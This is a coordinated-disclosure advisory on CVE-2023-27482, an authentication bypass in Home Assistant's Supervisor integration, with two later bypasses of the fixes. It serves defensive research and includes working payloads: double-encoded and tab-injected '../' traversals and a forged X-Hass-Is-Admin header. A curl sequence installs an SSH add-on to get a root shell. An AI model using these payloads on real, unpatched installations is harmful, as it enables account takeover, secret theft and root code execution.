# Introduction

This write-up describes a vulnerability ([CVE-2023-27482](https://github.com/home-assistant/core/security/advisories/GHSA-2j8f-h4mr-qr25)) found in [Home Assistant](https://www.home-assistant.io/), a popular open source home automation software. The original vulnerability was found to affect versions before 2023.3.0 where a mitigation is introduced. Bypasses were discovered which meant the vulnerable versions include Home Assistant Core 2023.3.0 and 2023.3.1 and Home Assistant Supervisor 2023.03.2. Home Assistant installations running Home Assistant Core 2023.3.2 or later, and Home Assistant Supervisor 2023.03.3 or later are not affected.

A bypass for the mitigation was found which affects Home Assistant Core versions 2023.3.0 and 2023.3.1. A mitigation was introduced to the Supervisor component in Home Assistant Supervisor 2023.03.2 which fixes this bypass.

An alternative bypass was found which affects Home Assistant Core versions 2023.3.0 and 2023.3.1 even when running the patched Supervisor 2023.03.2. A mitigation was introduced to the Supervisor component in Home Assistant 2023.03.3 which fixes this bypass.

# Overview

An authentication bypass was discovered in the Home Assistant Supervisor Integration that allows an unauthenticated user to access any Supervisor API leading to account takeover, information disclosure, and remote code execution. The [integration](https://www.home-assistant.io/integrations/hassio/) is installed by default on Home Assistant OS and Home Assistant Supervised installations, and, according to the opt-in integration analytics provided by Home Assistant, is claimed to be used by 74.9% of active installations at the time of writing. Although it was not tested, the vulnerability may also affect Home Assistant Cloud.

# Timeline

- **17/02/2023** - We begin researching the Home Assistant Supervisor Integration and discover the vulnerability
- **20/02/2023** - Vulnerability report sent to security@home-assistant.io
- **27/02/2023** - Follow up email sent to confirm receipt of report
- **28/02/2023** - Confirmation of receipt from Home Assistant
- **01/03/2023** - Home Assistant replies detailing plans to release hardening fixes, request a CVE and publish a blog post
- **01/03/2023** - [CVE-2023-27482](https://github.com/home-assistant/core/security/advisories/GHSA-2j8f-h4mr-qr25) reserved
- **01/03/2023** - Home Assistant 2023.3.0 is released, containing hardening in the HTTP integration security filters middleware
- **08/03/2023** - Home Assistant Supervisor 2023.03.1 is released, containing [hardening](https://github.com/home-assistant/core/pull/88921/files) in the security middleware
- **09/03/2023** - Home Assistant 2023.3.2 is released, containing further fixes in the Supervisor integration
- **09/03/2023** - Home Assistant publishes [blog post](https://www.home-assistant.io/blog/2023/03/08/supervisor-security-disclosure/)
- **21/03/2023** - Bypass affecting Home Assistant Core <=2023.3.1 discovered and reported to vendor
- **21/03/2023** - Confirmation of receipt from Home Assistant
- **22/03/2023** - Home Assistant Supervisor 2023.03.2 is released, containing [mitigation](https://github.com/home-assistant/supervisor/commit/2ae2d0e1070067b2b47bdfecfb44eca697b964fd) against the bypass
- **26/03/2023** - Bypass affecting Home Assistant Core <=2023.3.1 and Supervisor <=2023.03.2 discovered
- **27/03/2023** - Bypass reported to vendor
- **28/03/2023** - Confirmation of receipt from Home Assistant
- **29/03/2023** - Home Assistant Supervisor 2023.03.3 is released, containing [mitigation](https://github.com/home-assistant/supervisor/commit/cede47e95c1349831b52ad354cdaf915ce18bca6) against the bypass
- **04/05/2023** - [Advisory](https://github.com/home-assistant/core/security/advisories/GHSA-2j8f-h4mr-qr25) updated to reflect correct versions
- **10/05/2023** - Public release of this advisory

# Description

The HassIO integration exposes a [HTTP API](https://github.com/home-assistant/core/blob/6cab27f378ebdeb14236ae7d08dfd0701cc000bb/homeassistant/components/hassio/__init__.py#L406) to allow authenticated users to access the Supervisor API from within Home Assistant itself. The view class is defined [here](https://github.com/home-assistant/core/blob/6cab27f378ebdeb14236ae7d08dfd0701cc000bb/homeassistant/components/hassio/http.py#L56) with the `url` set to `"/api/hassio/{path:.+}"` and `requires_auth` set to `False`. The handler is set up for GET, DELETE and POST requests and essentially proxies the request to the Supervisor API after performing authentication if necessary. The code for the handler can be seen [here](https://github.com/home-assistant/core/blob/6cab27f378ebdeb14236ae7d08dfd0701cc000bb/homeassistant/components/hassio/http.py#L68-L80):

```py
async def _handle(
    self, request: web.Request, path: str
) -> web.Response | web.StreamResponse:
    """Route data to Hass.io."""
    hass = request.app["hass"]
    if _need_auth(hass, path) and not request[KEY_AUTHENTICATED]:
        return web.Response(status=HTTPStatus.UNAUTHORIZED)

    return await self._command_proxy(path, request)

delete = _handle
get = _handle
post = _handle
```

Notably, it handles authentication using the [`_need_auth`](https://github.com/home-assistant/core/blob/6cab27f378ebdeb14236ae7d08dfd0701cc000bb/homeassistant/components/hassio/http.py#L169-L175) function, which is defined as:

```py
def _need_auth(hass: HomeAssistant, path: str) -> bool:
    """Return if a path need authentication."""
    if not async_is_onboarded(hass) and NO_AUTH_ONBOARDING.match(path):
        return False
    if NO_AUTH.match(path):
        return False
    return True
```

The definition of the [`NO_AUTH`](https://github.com/home-assistant/core/blob/6cab27f378ebdeb14236ae7d08dfd0701cc000bb/homeassistant/components/hassio/http.py#L50) variable is a regular expression:

```py
NO_AUTH = re.compile(r"^(?:" r"|app/.*" r"|[store\/]*addons/[^/]+/(logo|icon)" r")$")
```

This is used to allow unauthenticated access to static media such as JavaScript files and image assets.

The vulnerability lies in this method of allowing the authentication to be bypassed for these particular files, as a path such as `app/../supervisor/info` matches the `NO_AUTH` regular expression, but will resolve to the path `supervisor/info`.

The [`http` integration](https://www.home-assistant.io/integrations/http) upon which the HTTP API is built on top of has some basic security filter middleware to prevent path traversal attacks such as this, however it was found to be easily bypassed. It attemps to block path traversal requests by checking the `request.path` field against a [regular expression](https://github.com/home-assistant/core/blob/6cab27f378ebdeb14236ae7d08dfd0701cc000bb/homeassistant/components/http/security_filter.py#L23-L25):

```py
# File Injections
r"|(\.\.//?)+"  # ../../anywhere
r"|[a-zA-Z0-9_]=/([a-z0-9_.]//?)+"  # .html?v=/.//test
```

As stated in the [aiohttp documentation](https://docs.aiohttp.org/en/stable/web_reference.html#aiohttp.web.BaseRequest.path) the `request.path` field is URL-decoded. Although a payload such as `app/.%2e/supervisor/info` will be caught by the filter (as it will decode to `app/../supervisor/info`), a double URL-encoded payload such as `app/.%252e/supervisor/info` will not (as it will decode to `app/.%2e/supervisor/info`). Because of the behaviour of the aiohttp client used to proxy the request to the Supervisor API, this path will be decoded and normalised and will eventually resolve to `/supervisor/info` when it reaches the Supervisor API. This allows an unauthenticated user to access any endpoint on the Supervisor API.

# Proof of Concept

The vulnerability can be tested on any Home Assistant OS or Supervised installation by accessing the `/api/hassio/app/.%252e/supervisor/info` path:

```
$ http http://192.168.1.20:8123/api/hassio/app/.%252e/supervisor/info
HTTP/1.1 200 OK
Content-Type: application/json
Date: Fri, 17 Feb 2023 03:02:58 GMT
Server: Python/3.10 aiohttp/3.8.3
Transfer-Encoding: chunked

{
    "data": {
        "addons": [],
        "addons_repositories": [
            {
                "name": "Local add-ons",
                "slug": "local"
            },
            {
                "name": "ESPHome",
                "slug": "5c53de3b"
            },
            {
                "name": "Official add-ons",
                "slug": "core"
            },
            {
                "name": "Home Assistant Community Add-ons",
                "slug": "a0d7b954"
            }
        ],
        "arch": "amd64",
        "auto_update": true,
        "channel": "stable",
        "debug": false,
        "debug_block": false,
        "diagnostics": true,
        "healthy": false,
        "ip_address": "172.30.32.2",
        "logging": "info",
        "supported": true,
        "timezone": "Australia/Melbourne",
        "update_available": true,
        "version": "2022.12.1",
        "version_latest": "2023.01.1",
        "wait_boot": 5
    },
    "result": "ok"
}
```

## Remote Code Execution

By installing and configuring the [SSH & Web Terminal Add-on](https://github.com/hassio-addons/addon-ssh/tree/main), it is possible to achieve code execution on the host system as root. Although add-ons are run as docker containers, when configured with protections disabled, the container is run with extra privileges and the docker socket is mounted, allowing access to the host system.

```
❯ curl -X POST http://192.168.20.182:8123/api/hassio/app/.%252e/store/addons/a0d7b954_ssh/install
{"result": "ok", "data": {}}
❯ curl -X POST http://192.168.20.182:8123/api/hassio/app/.%252e/addons/a0d7b954_ssh/security -H 'Content-Type: application/json' -d '{"protected":"false"}'
{"result": "ok", "data": {}}
❯ curl -X POST http://192.168.20.182:8123/api/hassio/app/.%252e/addons/a0d7b954_ssh/options -H 'Content-Type: application/json' -d '{"options":{"init_commands":[],"packages":[],"share_sessions":false,"ssh":{"allow_agent_forwarding":false,"allow_remote_port_forwarding":false,"allow_tcp_forwarding":false,"authorized_keys":[],"compatibility_mode":false,"password":"hunter2","sftp":false,"username":"hassio"},"zsh":true}}'
{"result": "ok", "data": {}}
❯ curl -X POST http://192.168.20.182:8123/api/hassio/app/.%252e/addons/a0d7b954_ssh/restart
{"result": "ok", "data": {}}
❯ ssh 192.168.20.182 -p22 -lhassio
The authenticity of host '192.168.20.182 (192.168.20.182)' can't be established.
ED25519 key fingerprint is SHA256:IruxlIdZZZife5t2Y2g69zG/+mqc0nfbPdKXR+AX2ZY.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.20.182' (ED25519) to the list of known hosts.
hassio@192.168.20.182's password:

| |  | |                          /\           (_)   | |            | |
| |__| | ___  _ __ ___   ___     /  \   ___ ___ _ ___| |_ __ _ _ __ | |_
|  __  |/ _ \| '_ \ _ \ / _ \   / /\ \ / __/ __| / __| __/ _\ | '_ \| __|
| |  | | (_) | | | | | |  __/  / ____ \\__ \__ \ \__ \ || (_| | | | | |_
|_|  |_|\___/|_| |_| |_|\___| /_/    \_\___/___/_|___/\__\__,_|_| |_|\__|

Welcome to the Home Assistant command line.

System information
  IPv4 addresses for enp0s3: 192.168.20.182/24
  IPv6 addresses for enp0s3: fe80::494d:126b:afb:d3a7/64

  OS Version:               Home Assistant OS 9.5
  Home Assistant Core:      2023.2.5

  Home Assistant URL:       http://homeassistant.local:8123
  Observer URL:             http://homeassistant.local:4357
➜  ~ id
uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)
➜  ~ ls -la /run/docker.sock
srw-rw----    1 root     messageb         0 Mar  2 13:21 /run/docker.sock
➜  ~ docker container ls
CONTAINER ID   IMAGE                                                      COMMAND   CREATED              STATUS              PORTS                                   NAMES
911c3106d154   ghcr.io/hassio-addons/ssh/amd64:13.0.2                     "/init"   About a minute ago   Up About a minute                                           addon_a0d7b954_ssh
b0360f377737   ghcr.io/home-assistant/qemux86-64-homeassistant:2023.2.5   "/init"   About an hour ago    Up About an hour                                            homeassistant
ab38a742f60d   ghcr.io/home-assistant/amd64-hassio-multicast:2022.02.0    "/init"   2 hours ago          Up 2 hours                                                  hassio_multicast
67507a5d4a02   ghcr.io/home-assistant/amd64-hassio-audio:2022.07.0        "/init"   2 hours ago          Up 2 hours                                                  hassio_audio
ae1247016e6c   ghcr.io/home-assistant/amd64-hassio-dns:2022.04.1          "/init"   2 hours ago          Up 2 hours                                                  hassio_dns
faac083f6962   ghcr.io/home-assistant/amd64-hassio-cli:2022.11.0          "/init"   2 hours ago          Up 2 hours                                                  hassio_cli
90d1c95343ad   ghcr.io/home-assistant/amd64-hassio-supervisor:latest      "/init"   2 hours ago          Up 2 hours                                                  hassio_supervisor
9eee3f964e08   ghcr.io/home-assistant/amd64-hassio-observer:2021.10.0     "/init"   13 days ago          Up 2 hours          0.0.0.0:4357->80/tcp, :::4357->80/tcp   hassio_observer
```

# Impact

As an unauthenticated user is able to access any endpoint on the [Supervisor API](https://developers.home-assistant.io/docs/api/supervisor/endpoints), it is possible to create and download full backups, which includes the `.storage/auth` file containing authentication keys. These backups may also contain other sensitive information such as the `secrets.yaml` file (containing passwords and API keys for user-configured third-party services) and the Home Assistant Database containing events data. Furthermore, an attacker may achieve remote code execution as root on the host system by installing and configuring the SSH & Web Terminal Add-on.

# Bypass 1

The originally reported bug was mitigated in Home Assistant Core 2023.3.0 with the following [patch](https://github.com/home-assistant/core/pull/88921):

```diff
diff --git a/homeassistant/components/http/security_filter.py b/homeassistant/components/http/security_filter.py
index 57ae906317099..a9b32bd7f4c82 100644
--- a/homeassistant/components/http/security_filter.py
+++ b/homeassistant/components/http/security_filter.py
@@ -5,6 +5,7 @@
 import logging
 import re
 from typing import Final
+from urllib.parse import unquote
 
 from aiohttp.web import Application, HTTPBadRequest, Request, StreamResponse, middleware
 
@@ -39,18 +40,24 @@
 def setup_security_filter(app: Application) -> None:
     """Create security filter middleware for the app."""
 
+    def _recursive_unquote(value: str) -> str:
+        """Handle values that are encoded multiple times."""
+        if (unquoted := unquote(value)) != value:
+            unquoted = _recursive_unquote(unquoted)
+        return unquoted
+
     @middleware
     async def security_filter_middleware(
         request: Request, handler: Callable[[Request], Awaitable[StreamResponse]]
     ) -> StreamResponse:
-        """Process request and tblock commonly known exploit attempts."""
-        if FILTERS.search(request.path):
+        """Process request and block commonly known exploit attempts."""
+        if FILTERS.search(_recursive_unquote(request.path)):
             _LOGGER.warning(
                 "Filtered a potential harmful request to: %s", request.raw_path
             )
             raise HTTPBadRequest
 
-        if FILTERS.search(request.query_string):
+        if FILTERS.search(_recursive_unquote(request.query_string)):
             _LOGGER.warning(
                 "Filtered a request with a potential harmful query string: %s",
                 request.raw_path,
```

It does not affect the HassIO integration itself but mitigates the original payload which involved double URL encoding the path traversal to be `/api/hassio/app/.%252e/supervisor/info`. Previously, this payload bypassed these security filters because the path was only URL decoded once, so after decoding `.%252e/` the result would be `.%2e/` and this would not be caught by the regular expressions used to perform the filter checks (see [security_filter.py](https://github.com/home-assistant/core/blob/dev/homeassistant/components/http/security_filter.py) for more details on how it works). Because the decoded path would then be proxied to the Supervisor using `aiohttp.ClientSession`, it would be decoded and eventually reach the Supervisor as just `/supervisor/info`.

For the purposes of bypassing the patches live on 2023.3.0 and 2023.3.1, we don't need to consider the changes made to the Supervisor, as they are effectively nonexistent since the [`core_proxy` middleware is more or less skipped](https://github.com/home-assistant/supervisor/blob/2ae2d0e1070067b2b47bdfecfb44eca697b964fd/supervisor/api/middleware/security.py#L275-L279) if the version of Home Assistant Core is 2023.3.0 or higher.

Bypassing the hardening to exploit this issue requires not only poking at the filter itself, but looking at the surrounding context; where user input is being used and how. Revisiting the [`HassIOView`](https://github.com/home-assistant/core/blob/9381865f1ce7e78a1d4a3fdf56d11e542de5f24f/homeassistant/components/hassio/http.py) as of 2023.3.1, we notice a few important things:

- The `url` used is a dynamic URL, which are handled by the [`DynamicResource`](https://github.com/aio-libs/aiohttp/blob/6da04694fd87a39af9c3856048c9ff23ca815f88/aiohttp/web_urldispatcher.py#L415) class:
    ```py
    class HassIOView(HomeAssistantView):
        """Hass.io view to handle base part."""

        name = "api:hassio"
        url = "/api/hassio/{path:.+}"
        requires_auth = False
    ```
- In the [`_command_proxy`](https://github.com/home-assistant/core/blob/9381865f1ce7e78a1d4a3fdf56d11e542de5f24f/homeassistant/components/hassio/http.py#L82-L124) method, the request is sent to the Supervisor using `aiohttp.ClientSession`:
    ```py
    class HassIOView(HomeAssistantView):
    """Hass.io view to handle base part."""

        [...]

        def __init__(self, host: str, websession: aiohttp.ClientSession) -> None:
            """Initialize a Hass.io base view."""
            self._host = host
            self._websession = websession

        [...]


        async def _command_proxy(
            self, path: str, request: web.Request
        ) -> web.StreamResponse:

            [...]

            client = await self._websession.request(
                method=request.method,
                url=f"http://{self._host}/{path}",
                params=request.query,
                data=request.content,
                headers=headers,
                timeout=_get_timeout(path),
            )
    ```

These two points are important as we'll look into how they work under the hood.

## Dynamic Resources in aiohttp

The first thing to look at is how dynamic resources are handled in aiohttp. For now, we are essentially interested in understanding what the values of `request.path` (the `path` field on the `Request` object which gets checked against the security filters) and `path` (the user-provided parameter which is used to construct the request to the Supervisor) will be during this request. At a very high level, when routes are registered in a aiohttp server, they are added to the router as a resource. When a request comes in, the server looks through the resources and tries to match which resource the request is for. For [`DynamicResource`](https://github.com/aio-libs/aiohttp/blob/6da04694fd87a39af9c3856048c9ff23ca815f88/aiohttp/web_urldispatcher.py#L415-L487)s, this is implemented by parsing the regular expression parts of the path into named capture groups and simply matching the incoming request's path against that:

```py
class DynamicResource(Resource):
    DYN = re.compile(r"\{(?P<var>[_a-zA-Z][_a-zA-Z0-9]*)\}")
    DYN_WITH_RE = re.compile(r"\{(?P<var>[_a-zA-Z][_a-zA-Z0-9]*):(?P<re>.+)\}")
    GOOD = r"[^{}/]+"

    def __init__(self, path: str, *, name: Optional[str] = None) -> None:
        super().__init__(name=name)
        pattern = ""
        formatter = ""
        for part in ROUTE_RE.split(path):
            match = self.DYN.fullmatch(part)
            if match:
                pattern += "(?P<{}>{})".format(match.group("var"), self.GOOD)
                formatter += "{" + match.group("var") + "}"
                continue

            match = self.DYN_WITH_RE.fullmatch(part)
            if match:
                pattern += "(?P<{var}>{re})".format(**match.groupdict())
                formatter += "{" + match.group("var") + "}"
                continue

            if "{" in part or "}" in part:
                raise ValueError(f"Invalid path '{path}'['{part}']")

            part = _requote_path(part)
            formatter += part
            pattern += re.escape(part)

        try:
            compiled = re.compile(pattern)
        except re.error as exc:
            raise ValueError(f"Bad pattern '{pattern}': {exc}") from None
        assert compiled.pattern.startswith(PATH_SEP)
        assert formatter.startswith("/")
        self._pattern = compiled
        self._formatter = formatter

    [...]

    def _match(self, path: str) -> Optional[Dict[str, str]]:
        match = self._pattern.fullmatch(path)
        if match is None:
            return None
        else:
            return {
                key: _unquote_path(value) for key, value in match.groupdict().items()
            }
```

As an example, the dynamic resource with `path = '/api/hassio/{path:.+}'` will have a `_pattern = re.compile('/api/hassio/(?P<path>.+)')`. Notably, the `_match` method calls [`_unquote_path`](https://github.com/aio-libs/aiohttp/blob/6da04694fd87a39af9c3856048c9ff23ca815f88/aiohttp/web_urldispatcher.py#L1186-L1187) on the matched value, so we understand that the match info will contain unquoted values:

```py
from yarl import URL

[...]

def _unquote_path(value: str) -> str:
    return URL.build(path=value, encoded=True).path
```

## URL Handling in `aiohttp.ClientSession`

Keeping in mind that the goal is still path traversal, and that we can control the raw bytes of the `path` value which is used to construct the URL for the Supervisor request, we began to look at how this is actually used by the client. We are interested in the handling of the `url` parameter in the [`ClientSession.request`](https://github.com/aio-libs/aiohttp/blob/6da04694fd87a39af9c3856048c9ff23ca815f88/aiohttp/client.py#L302-L306) method in particular:

```py
    def request(
        self, method: str, url: StrOrURL, **kwargs: Any
    ) -> "_RequestContextManager":
        """Perform HTTP request."""
        return _RequestContextManager(self._request(method, url, **kwargs))
```

It is a simple wrapper around the [`_request`](https://github.com/aio-libs/aiohttp/blob/6da04694fd87a39af9c3856048c9ff23ca815f88/aiohttp/client.py#L316-L643) method which handles the parsing of the provided url using the [`_build_url`](https://github.com/aio-libs/aiohttp/blob/6da04694fd87a39af9c3856048c9ff23ca815f88/aiohttp/client.py#LL308-L314C44) method:

```py
from yarl import URL

[...]

    def _build_url(self, str_or_url: StrOrURL) -> URL:
        url = URL(str_or_url)
        if self._base_url is None:
            return url
        else:
            assert not url.is_absolute() and url.path.startswith("/")
            return self._base_url.join(url)

    async def _request(
        self,
        method: str,
        str_or_url: StrOrURL,
        *,
        params: Optional[Mapping[str, str]] = None,
        data: Any = None,
        json: Any = None,
        cookies: Optional[LooseCookies] = None,
        headers: Optional[LooseHeaders] = None,
        skip_auto_headers: Optional[Iterable[str]] = None,
        auth: Optional[BasicAuth] = None,
        allow_redirects: bool = True,
        max_redirects: int = 10,
        compress: Optional[str] = None,
        chunked: Optional[bool] = None,
        expect100: bool = False,
        raise_for_status: Union[
            None, bool, Callable[[ClientResponse], Awaitable[None]]
        ] = None,
        read_until_eof: bool = True,
        proxy: Optional[StrOrURL] = None,
        proxy_auth: Optional[BasicAuth] = None,
        timeout: Union[ClientTimeout, _SENTINEL, None] = sentinel,
        ssl: Optional[Union[SSLContext, bool, Fingerprint]] = None,
        proxy_headers: Optional[LooseHeaders] = None,
        trace_request_ctx: Optional[SimpleNamespace] = None,
        read_bufsize: Optional[int] = None,
        auto_decompress: Optional[bool] = None,
    ) -> ClientResponse:

        [...]

        try:
            url = self._build_url(str_or_url)
        except ValueError as e:
            raise InvalidURL(str_or_url) from e
```

This calls `yarl.URL` on the `url` parameter with default (no) arguments. This is defined [here](https://github.com/aio-libs/yarl/blob/89cc6b03cc8e51f2cb5bb7c8d2a9ee7d9fa24d6c/yarl/_url.py#L166-L212):

```py
from urllib.parse import SplitResult, parse_qsl, quote, urljoin, urlsplit, urlunsplit

[...]

class URL:
    
    [...]

    def __new__(cls, val="", *, encoded=False, strict=None):
        if strict is not None:  # pragma: no cover
            warnings.warn("strict parameter is ignored")
        if type(val) is cls:
            return val
        if type(val) is str:
            val = urlsplit(val)
        elif type(val) is SplitResult:
            if not encoded:
                raise ValueError("Cannot apply decoding to SplitResult")
        elif isinstance(val, str):
            val = urlsplit(str(val))
        else:
            raise TypeError("Constructor parameter should be str")

        if not encoded:
            if not val[1]:  # netloc
                netloc = ""
                host = ""
            else:
                host = val.hostname
                if host is None:
                    raise ValueError("Invalid URL: host is required for absolute urls")

                try:
                    port = val.port
                except ValueError as e:
                    raise ValueError(
                        "Invalid URL: port can't be converted to integer"
                    ) from e

                netloc = cls._make_netloc(
                    val.username, val.password, host, port, encode=True, requote=True
                )
            path = cls._PATH_REQUOTER(val[2])
            if netloc:
                path = cls._normalize_path(path)

            cls._validate_authority_uri_abs_path(host=host, path=path)
            query = cls._QUERY_REQUOTER(val[3])
            fragment = cls._FRAGMENT_REQUOTER(val[4])
            val = SplitResult(val[0], netloc, path, query, fragment)

        self = object.__new__(cls)
        self._val = val
        self._cache = {}
        return self
```

In our case, there will be a `netloc` value so the path will be normalised with the line `path = cls._normalize_path(path)`. Furthermore, the line `val = urlsplit(val)` will be hit which manipulates the url. This is part of the Python standard library, [defined](https://github.com/python/cpython/blob/53d9cd95cd91f1a291a3923acb95e0e86942291a/Lib/urllib/parse.py#L433-L481) in the `urllib.parse` module:

```py
def urlsplit(url, scheme='', allow_fragments=True):
    """Parse a URL into 5 components:
    <scheme>://<netloc>/<path>?<query>#<fragment>
    The result is a named 5-tuple with fields corresponding to the
    above. It is either a SplitResult or SplitResultBytes object,
    depending on the type of the url parameter.
    The username, password, hostname, and port sub-components of netloc
    can also be accessed as attributes of the returned object.
    The scheme argument provides the default value of the scheme
    component when no scheme is found in url.
    If allow_fragments is False, no attempt is made to separate the
    fragment component from the previous component, which can be either
    path or query.
    Note that % escapes are not expanded.
    """

    url, scheme, _coerce_result = _coerce_args(url, scheme)

    for b in _UNSAFE_URL_BYTES_TO_REMOVE:
        url = url.replace(b, "")
        scheme = scheme.replace(b, "")

    allow_fragments = bool(allow_fragments)
    netloc = query = fragment = ''
    i = url.find(':')
    if i > 0 and url[0].isascii() and url[0].isalpha():
        for c in url[:i]:
            if c not in scheme_chars:
                break
        else:
            scheme, url = url[:i].lower(), url[i+1:]

    if url[:2] == '//':
        netloc, url = _splitnetloc(url, 2)
        if (('[' in netloc and ']' not in netloc) or
                (']' in netloc and '[' not in netloc)):
            raise ValueError("Invalid IPv6 URL")
    if allow_fragments and '#' in url:
        url, fragment = url.split('#', 1)
    if '?' in url:
        url, query = url.split('?', 1)
    _checknetloc(netloc)
    v = SplitResult(scheme, netloc, url, query, fragment)
    return _coerce_result(v)
```

The key part here is in the first for loop, where bytes in `_UNSAFE_URL_BYTES_TO_REMOVE` are removed from the url. [`_UNSAFE_URL_BYTES_TO_REMOVE`](https://github.com/python/cpython/blob/53d9cd95cd91f1a291a3923acb95e0e86942291a/Lib/urllib/parse.py#L83) contains some whitespace characters:

```py
# Unsafe bytes to be removed per WHATWG spec
_UNSAFE_URL_BYTES_TO_REMOVE = ['\t', '\r', '\n']
```

This is the main idea behind the bypass, as this provides a way to potentially cause a difference in the value of `path` (and hence `request.path`) seen by the security filters, and the value of the path after it's been sent by the client.

## Proof of Concept

To bypass the security filters and exploit the path traversal, we want to send a path which doesn't contain `../` when checked by the security filters, but contains `../` when sent by the client to the Supervisor API. As above, tabs, carriage returns and line feed characters are removed from the URL when it reaches the client, but not in an incoming request to the Home Assistant Core aiohttp server. So path traversal may performed with the payload `.\t./`.

This works to bypass the mitigations introduced in Home Assistant Core 2023.3.0:

```
$ http http://192.168.104.182:8123/api/hassio/app/.%09./core/info
HTTP/1.1 200 OK
Content-Type: application/json
Date: Mon, 20 Mar 2023 23:18:43 GMT
Server: Python/3.10 aiohttp/3.8.4
Transfer-Encoding: chunked

{
    "data": {
        "arch": "amd64",
        "audio_input": null,
        "audio_output": null,
        "boot": true,
        "image": "ghcr.io/home-assistant/qemux86-64-homeassistant",
        "ip_address": "172.30.32.1",
        "machine": "qemux86-64",
        "port": 8123,
        "ssl": false,
        "update_available": true,
        "version": "2023.3.1",
        "version_latest": "2023.3.5",
        "watchdog": true
    },
    "result": "ok"
}
```

The impact is exactly the same as in CVE-2023-27482.

# Bypass 2

An alternative bypass which affects Home Assistant Core 2023.3.0 and 2023.3.1 running Home Assistant Supervisor 2023.03.2 was found which uses the [`/api/hassio_ingress` endpoint](https://github.com/home-assistant/core/blob/9733d31cd09d581c4ade91f0025f21ce7192ad9c/homeassistant/components/hassio/ingress.py#L33-L167).

As with the `/api/hassio` endpoint, requests sent to the `/api/hassio_ingress` endpoint will be proxied to the Supervisor API. 

The behaviour with the ingress endpoint is slightly different to the `/api/hassio` endpoint as it [copies some headers](https://github.com/home-assistant/core/blob/9733d31cd09d581c4ade91f0025f21ce7192ad9c/homeassistant/components/hassio/ingress.py#L170-L192) from the user's request to the request sent to the Supervisor API:

```py
def _init_header(request: web.Request, token: str) -> CIMultiDict | dict[str, str]:
    """Create initial header."""
    headers = {}

    # filter flags
    for name, value in request.headers.items():
        if name in (
            hdrs.CONTENT_LENGTH,
            hdrs.CONTENT_ENCODING,
            hdrs.TRANSFER_ENCODING,
            hdrs.SEC_WEBSOCKET_EXTENSIONS,
            hdrs.SEC_WEBSOCKET_PROTOCOL,
            hdrs.SEC_WEBSOCKET_VERSION,
            hdrs.SEC_WEBSOCKET_KEY,
        ):
            continue
        headers[name] = value
        
    # Inject token / cleanup later on Supervisor
    headers[X_AUTH_TOKEN] = os.environ.get("SUPERVISOR_TOKEN", "")

    # Ingress information
    headers[X_INGRESS_PATH] = f"/api/hassio_ingress/{token}"
```

Notably, the headers that are copied are based on a denylist, so arbitrary headers other than these few can be provided.

Within the Supervisor API, the [`core_proxy`](https://github.com/home-assistant/supervisor/blob/3646ae070efae07ef99723465b60e5ddc02283ec/supervisor/api/middleware/security.py#L273-L313) middleware function responsible for blocking unauthorised requests from the Core uses the request headers to do so:

```py
    @middleware
    async def core_proxy(self, request: Request, handler: RequestHandler) -> Response:
        """Validate user from Core API proxy."""
        if (
            request[REQUEST_FROM] != self.sys_homeassistant
            or self.sys_homeassistant.version >= _CORE_VERSION
        ):
            return await handler(request)

        authorization_index: int | None = None
        content_type_index: int | None = None
        user_request: bool = False
        admin_request: bool = False
        ingress_request: bool = False

        for idx, (key, value) in enumerate(request.raw_headers):
            if key in (b"Authorization", b"X-Hassio-Key"):
                authorization_index = idx
            elif key == b"Content-Type":
                content_type_index = idx
            elif key == b"X-Hass-User-ID":
                user_request = True
            elif key == b"X-Hass-Is-Admin":
                admin_request = value == b"1"
            elif key == b"X-Ingress-Path":
                ingress_request = True

        if user_request or admin_request:
            return await handler(request)

        is_proxy_request = (
            authorization_index is not None
            and content_type_index is not None
            and content_type_index - authorization_index == 1
        )

        if (
            not CORE_FRONTEND.match(request.path) and is_proxy_request
        ) or ingress_request:
            raise HTTPBadRequest()
        return await handler(request)
```

If either `X-Hass-User-ID` or `X-Hass-Is-Admin` headers are provided, the request is allowed through, bypassing the final ingress check. Since the ingress endpoint allows passing these headers, by including either of these headers, combined with the payload from the first bypass, it is possible to access the Supervisor API on HA Core up to 2023.3.1 and on HA Supervisor up to 2023.03.2.

## Proof of Concept

```
$ http http://192.168.1.208:8123/api/hassio_ingress/.%09./supervisor/info X-Hass-Is-Admin:1
HTTP/1.1 200 OK
Date: Fri, 24 Mar 2023 03:57:50 GMT
Server: Python/3.10 aiohttp/3.8.4
Connection: close
Content-Type: application/json
Content-Length: 1050

{
  "result": "ok",
  "data": {
    "version": "2023.03.2",
    "version_latest": "2023.03.dev2103",
    "update_available": false,
    "channel": "dev",
    "arch": "amd64",
    "supported": false,
    "healthy": true,
    [...]
  }
}
```

The impact is exactly the same as in CVE-2023-27482.

# Discovered

- Original bug: February 2023, Joseph Surin, elttam
- Mitigation bypass 1: March 2023, Joseph Surin, elttam
- Mitigation bypass 2: March 2023, Victor Kahan, elttam
